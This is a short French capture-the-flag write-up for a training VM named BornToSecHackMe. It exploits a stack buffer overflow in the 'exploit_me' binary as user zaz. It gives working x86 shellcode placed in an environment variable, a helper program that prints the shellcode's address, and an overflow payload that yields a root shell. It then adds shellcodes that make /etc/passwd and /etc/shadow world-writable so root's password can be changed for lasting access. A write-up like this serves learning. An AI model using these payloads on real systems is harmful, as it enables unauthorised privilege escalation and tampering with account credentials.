# Branch #3

Note : Pour accéder à cette branche, suivre le writeup #1 jusqu'à avoir accès au compte zaz.

## zaz : Exploit_me (Shellcode)

Cette faille est reservée aux commerciaux startup nation, parce que la ret2libc n'est pas assez disruptive dans le milieu.
En reprenant directement le shellcode utilisé dans mon rainfall :
```
export LIDLCODE=$(python -c 'print "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')
echo 'void main(){printf("%p\n", getenv("LIDLCODE"));}' > /tmp/lidl9.c; gcc /tmp/lidl9.c -o /tmp/lidl9; chmod 777 /tmp/lidl9; /tmp/lidl9 # 0xbfffff94 here
```
On envoie le payload :
```
zaz@BornToSecHackMe:~$ ./exploit_me $(python -c "print 'A' * 140 + '\x90\xff\xff\xbf'")
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
# whoami
root
```
Cette faille est beaucoup plus puissante que la précédente, on peut rendre le fichier `/etc/passwd` editable via ce shellcode :
```
export LIDLCODE=$(python -c 'print "\x6a\x0f\x58\x68\x90\x90\xff\x01\x59\xc1\xe9\x10\x68\x90\x73\x77\x64\x5b\xc1\xeb\x08\x53\x68\x2f\x70\x61\x73\x68\x2f\x65\x74\x63\x89\xe3\xcd\x80\xb0\x01\xb3\x01\xcd\x80"')
```
Ou même /etc/shadow avec :
```
export LIDLCODE=$(python -c 'print "\x31\xc0\x50\x68\x61\x64\x6f\x77\x68\x63\x2f\x73\x68\x68\x2f\x2f\x65\x74\xb0\x0f\x89\xe3\x66\xb9\xff\x01\xcd\x80\x31\xc0\x40\xcd\x80"')
```
Afin de pouvoir modifier le mot de passe de root en live et rendre son acces permanant pour tout utilisateur sans mot de passe.